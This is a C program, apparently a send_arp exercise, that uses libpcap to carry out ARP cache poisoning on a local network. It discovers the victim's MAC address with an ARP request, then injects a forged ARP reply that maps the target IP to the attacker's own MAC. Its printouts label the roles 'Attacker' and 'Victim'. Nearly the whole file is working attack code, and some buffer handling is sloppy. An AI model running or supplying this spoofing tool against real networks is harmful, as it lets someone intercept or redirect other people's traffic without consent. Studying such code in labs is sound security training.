#define ETHERTYPE_IP 0x0800

#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdlib.h>

#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>

/* 
 *  ARP header
 *  Address Resolution Protocol
 *  Base header size: 8 bytes
 */
struct libnet_arp_hdr
{
	uint16_t ar_hrd;	   /* format of hardware address */
#define ARPHRD_NETROM 0	/* from KA9Q: NET/ROM pseudo */
#define ARPHRD_ETHER 1	 /* Ethernet 10Mbps */
#define ARPHRD_EETHER 2	/* Experimental Ethernet */
#define ARPHRD_AX25 3	  /* AX.25 Level 2 */
#define ARPHRD_PRONET 4	/* PROnet token ring */
#define ARPHRD_CHAOS 5	 /* Chaosnet */
#define ARPHRD_IEEE802 6   /* IEEE 802.2 Ethernet/TR/TB */
#define ARPHRD_ARCNET 7	/* ARCnet */
#define ARPHRD_APPLETLK 8  /* APPLEtalk */
#define ARPHRD_LANSTAR 9   /* Lanstar */
#define ARPHRD_DLCI 15	 /* Frame Relay DLCI */
#define ARPHRD_ATM 19	  /* ATM */
#define ARPHRD_METRICOM 23 /* Metricom STRIP (new IANA id) */
#define ARPHRD_IPSEC 31	/* IPsec tunnel */
	uint16_t ar_pro;	   /* format of protocol address */
	uint8_t ar_hln;		   /* length of hardware address */
	uint8_t ar_pln;		   /* length of protocol addres */
	uint16_t ar_op;		   /* operation type */
#define ARPOP_REQUEST 1	/* req to resolve address */
#define ARPOP_REPLY 2	  /* resp to previous request */
#define ARPOP_REVREQUEST 3 /* req protocol address given hardware */
#define ARPOP_REVREPLY 4   /* resp giving protocol address */
#define ARPOP_INVREQUEST 8 /* req to identify peer */
#define ARPOP_INVREPLY 9   /* resp identifying peer */
						   /* address information allocated dynamically */
};

struct eth_header
{
	uint8_t dst_mac[6];
	uint8_t src_mac[6];
	uint16_t type;
};

void print_mac(uint8_t *p)
{
	for (int j = 0; j < 6; j++)
	{
		printf("%02X", p[j]);
		if (j != 5)
			printf(":");
	}
	printf("\n");
}

void print_ip(uint32_t p)
{
	for (int i = 0; i < 4; i++)
	{
		printf("%d", p & 0xff);
		p = p >> 8;
		if (i != 3)
			printf(".");
	}
	printf("\n");
}

void usage()
{
	printf("syntax: send_arp <interface> <send ip> <target ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[])
{

	struct eth_header *eth = (struct eth_header *)malloc(sizeof(struct eth_header) + 1);
	struct libnet_arp_hdr *arp = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr) + 1);

	if (argc != 4)
	{
		usage();
		return -1;
	}

	struct in_addr *send_ip = (struct in_addr *)malloc(sizeof(struct in_addr) + 1);
	struct in_addr *target_ip = (struct in_addr *)malloc(sizeof(struct in_addr) + 1);

	inet_pton(AF_INET, argv[2], send_ip);
	inet_pton(AF_INET, argv[3], target_ip);

	struct sockaddr_in *my_ip;
	struct ifreq ifr;
	int sockfd;

	char *name = argv[1];
	if (strlen(name) >= IFNAMSIZ)
		printf("device name is error.\n"), exit(0);

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);

	strcpy(ifr.ifr_name, name);
	//get HWaddr
	uint8_t my_mac[6];
	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1)
		printf("hwaddr error.\n"), exit(0);

	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, sizeof(my_mac));
	printf("Attacker HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

	//get inet addr
	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0)
		printf("ioctl error.\n"), exit(0);

	my_ip = (struct sockaddr_in *)&(ifr.ifr_addr);
	printf("Attacker inet addr: %s\n", inet_ntoa(my_ip->sin_addr));

	printf("Sender(Victim) inet addr: %s\n", inet_ntoa(*send_ip));
	printf("Target inet addr: %s\n\n", inet_ntoa(*target_ip));

	// make arp request
	uint8_t *packet_arp_req = (uint8_t *)malloc(sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 21);

	eth->type = htons(0x0806); //ARP
	memset(eth->dst_mac, 0xff, 6);
	memcpy(eth->src_mac, my_mac, 6);

	arp->ar_hrd = htons(ARPHRD_ETHER); //Ethernet
	arp->ar_pro = htons(0x0800);	   //IPv4
	arp->ar_hln = 6;				   //MAC length
	arp->ar_pln = 4;				   //IP length
	arp->ar_op = htons(ARPOP_REQUEST);

	packet_arp_req = (uint8_t *)eth;
	memcpy(packet_arp_req + sizeof(struct eth_header), (uint8_t *)arp, sizeof(struct libnet_arp_hdr));

	memcpy(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr), my_mac, 6);
	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 6) = htonl(my_ip->sin_addr.s_addr);
	memset(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 10, 0, 6);
	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 16) = send_ip->s_addr;

	printf("ARP request sent\n");
	uint8_t *tmp = packet_arp_req;
	for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
	{
		printf("%02x ", *(tmp + i));
		if ((i & 0x0f) == 0x0f)
			printf("\n");
	}
	printf("\n\n");

	// pcap open
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	if (pcap_inject(handle, packet_arp_req, sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20) == -1)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return -1;
	}

	while (true)
	{
		struct pcap_pkthdr *header;
		const uint8_t *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0)
			continue;
		if (res == -1 || res == -2)
			break;
		//printf("%u bytes captured\n", header->caplen);
		const uint8_t *p = packet;
		eth = (struct eth_header *)p;
		tmp = (uint8_t *)p;
		if (ntohs(eth->type) == 0x0806) // if ARP
		{
			p += sizeof(struct eth_header);
			arp = (struct libnet_arp_hdr *)p;
			p += sizeof(struct libnet_arp_hdr);
			uint8_t send_mac[6];
			memcpy(send_mac, p, 6);
			if ((memcmp(p + 6, send_ip, 4) == 0) && (memcmp(p + 10, my_mac, 6) == 0) && (*(uint32_t *)(p + 16) == ntohl(my_ip->sin_addr.s_addr)))
			{
				printf("Captured ARP reply\n");
				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
				{
					printf("%02x ", *(tmp + i));
					if ((i & 0x0f) == 0x0f)
						printf("\n");
				}
				printf("\n");

				printf("Sender(Victim) HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n\n", send_mac[0], send_mac[1], send_mac[2], send_mac[3], send_mac[4], send_mac[5]);
				
				// make ARP spoofing packet
				eth->type = htons(0x0806); //ARP
				memcpy(eth->dst_mac, send_mac, 6);
				memcpy(eth->src_mac, my_mac, 6);

				arp->ar_hrd = htons(ARPHRD_ETHER); //Ethernet
				arp->ar_pro = htons(0x0800);	   //IPv4
				arp->ar_hln = 6;				   //MAC length
				arp->ar_pln = 4;				   //IP length
				arp->ar_op = htons(ARPOP_REPLY);
				uint8_t *packet_arp_atk = (uint8_t *)malloc(sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 21);

				packet_arp_atk = (uint8_t *)eth;
				memcpy(packet_arp_atk + sizeof(struct eth_header), (uint8_t *)arp, sizeof(struct libnet_arp_hdr));

				memcpy(packet_arp_atk + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr), my_mac, 6);
				*(uint32_t *)(packet_arp_atk + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 6) = target_ip->s_addr;
				memcpy(packet_arp_atk + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 10, send_mac, 6);
				*(uint32_t *)(packet_arp_atk + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 16) = send_ip->s_addr;

				printf("ARP attack packet sent\n");
				tmp = packet_arp_atk;
				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
				{
					printf("%02x ", *(tmp + i));
					if ((i & 0x0f) == 0x0f)
						printf("\n");
				}
				printf("\n");

				if (pcap_inject(handle, packet_arp_atk, sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20) == -1)
				{
					fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
					return -1;
				}

				free(packet_arp_atk);
				return 0;
			}
		}
	}

	free(packet_arp_req);
	free(eth);
	free(arp);
	free(send_ip);
	free(target_ip);
	pcap_close(handle);
	return 0;
}

int main2(int argc, char *argv[])
{
	struct sockaddr_in *my_ip;
	struct ifreq ifr;
	int sockfd;

	char *name = "ens33";
	if (strlen(name) >= IFNAMSIZ)
		printf("device name is error.\n"), exit(0);

	strcpy(ifr.ifr_name, name);

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);

	//get inet addr
	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0)
		printf("ioctl error.\n"), exit(0);

	my_ip = (struct sockaddr_in *)&(ifr.ifr_addr);
	printf("inet addr: %s\n", inet_ntoa(my_ip->sin_addr));

	//get HWaddr
	uint8_t my_mac[6];
	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1)
		printf("hwaddr error.\n"), exit(0);

	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, sizeof(my_mac));
	printf("HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

	exit(0);
}
